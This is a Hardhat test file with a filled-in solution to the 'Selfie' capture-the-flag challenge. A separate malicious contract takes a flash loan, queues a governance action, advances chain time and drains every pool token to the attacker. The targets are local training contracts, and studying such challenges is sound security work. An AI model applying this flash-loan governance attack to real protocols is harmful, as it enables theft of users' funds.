const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
        const MaliciousContractSelfieFactory = await ethers.getContractFactory('MaliciousContractSelfie', attacker);

        // Init the tokenSnapshotFactory token with 2 million tokens
        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        // Gov token
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        // The pool initi with the DamnBaluableTokenSnapshot token and Gov address
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address
        );

        // Init the pool with 1.5 million tokens
        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);

        this.maliciousContract = await MaliciousContractSelfieFactory.deploy(
            this.pool.address,
            this.token.address,
            this.governance.address);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // Get a flashLoan, queue an action in the Gov and return the flash loan
        await this.maliciousContract.attack();

        // Simulate waiting for the action delay to pass.
        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 2 days

        // Execute the malicious queued payload
        await this.maliciousContract.drainToAttacker();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
